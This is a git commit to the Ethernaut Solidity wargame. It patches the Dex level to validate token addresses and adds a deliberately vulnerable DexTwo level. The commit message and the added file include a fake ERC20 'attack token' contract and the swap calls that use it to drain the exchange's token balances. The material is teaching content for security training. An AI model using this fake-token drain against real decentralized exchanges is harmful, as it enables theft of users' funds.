65340f6d72a9b816a588a4d42f3082b85c2c9606
Scott Tsai <scottt.tw@gmail.com>
2021-08-20 09:11:57 +0800

    New Level: DexTwo: Attack of the Evil Token
    The `Dex` level in Ethernaut, currently doesn't check that the ERC20 addresses are the ones it expects:
    
    ```
    contract Dex {
      function swap(address from, address to, uint amount) public {
            require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
            uint swap_amount = get_swap_amount(from, to, amount);
            IERC20(from).transferFrom(msg.sender, address(this), amount);
            IERC20(to).approve(address(this), swap_amount);
            IERC20(to).transferFrom(address(this), msg.sender, swap_amount);
        }
        function get_swap_amount(address from, address to, uint amount) public view returns(uint){
            return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
        }
    }
      ```
    
    The player can supply the address of an `DexAttackToken` instance as the input:
    
    ```
    contract DexAttackToken {
        function balanceOf(address) external pure returns (uint256) {
            return 1;
        }
    
        function transferFrom(
            address,
            address,
            uint256
        ) external pure returns (bool) {
            return true;
        }
    }
    ```
    
    Swapping from `DexAttackToken` to `token1` and `token2` would then drain the balance of the Dex contract:
    
    ```
    dex.swap(attackToken.address, token1.address, 1)
    dex.swap(attackToken.address, token2.address, 1)
    ```
    
    This patch proposes the following:
    
    * Add a `require((from == token1 && to == token2) ... )` to `swap` in the current `Dex` level
    * Create a new level, Dex Two, which keeps the vulnerability to the "evil token attack"
    * Explicitly require the player to drain `DexTwo` of both `token1` and `token2` balances
    * Give the player a hint to try an attack vector with a custom ERC20 token contract

---
+++ contracts/contracts/attacks/DexTwoAttack.sol
@@ -0,0 +1,16 @@
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.6.0;
+
+contract DexTwoAttackToken {
+    function balanceOf(address) external pure returns (uint256) {
+        return 1;
+    }
+
+    function transferFrom(
+        address,
+        address,
+        uint256
+    ) external pure returns (bool) {
+        return true;
+    }
+}
